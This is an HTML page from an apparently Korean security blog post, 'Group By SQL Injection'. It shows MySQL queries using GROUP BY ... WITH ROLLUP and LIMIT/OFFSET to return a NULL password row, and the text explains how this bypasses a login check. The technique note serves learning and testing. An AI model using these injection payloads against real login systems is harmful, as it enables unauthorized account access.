@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">39</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			Group By SQL Injection
+		</div>
+		<time class="post-date dt-published" datetime="2015-08-24T13:45:00+09:00" itemprop="datePublished">2015/08/24
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from member  group by 2 with rollup;
+
++-------+------+
+
+| id    | pw   |
+
++-------+------+
+
+| admin | 1234 |
+
+| admin | NULL |
+
++-------+------+
+
+2 rows in set (0.00 sec)
+
+
+
+
+
+mysql&gt; select * from user group by 2 with rollup limit 1,2;
+
++-------+----------+
+
+| id    | password |
+
++-------+----------+
+
+| admin | NULL     |
+
++-------+----------+
+
+1 row in set (0.00 sec)
+
+</code></pre></div></div>
+
+<p>이렇게 되면 ()를 쓰는 함수를 쓰지 안아도 우회가 가능하다.</p>
+
+<p>아이디만 맞으면 로그인이 가능하다.</p>
+
+<p>rollup함수는 그룹 조건에 따라 컬럼을 그룹화하고 그 데이터의 총합을 구해주는 함수다. 하지만 문자열의 총합을 구하게 되면</p>
+
+<p>NULL값을 반환하기 때문에 SQL Injection에 악용될수 있다.</p>
+
+<p>보통 로그인에는 limtit 1이 사용된다. 그렇기 때문에 뒤에 offset 1 을 쓰면 하나는 생략하고 출력한다는 의미다.</p>
+
+<p>이렇게 해도 로그인 우회가 가능하다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from user group by 2 with rollup limit 1 offset 1;
+
++-------+----------+
+
+| id    | password |
+
++-------+----------+
+
+| admin | NULL     |
+
++-------+----------+
+
+1 row in set (0.00 sec)
+
+
+
+mysql&gt;
+</code></pre></div></div>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
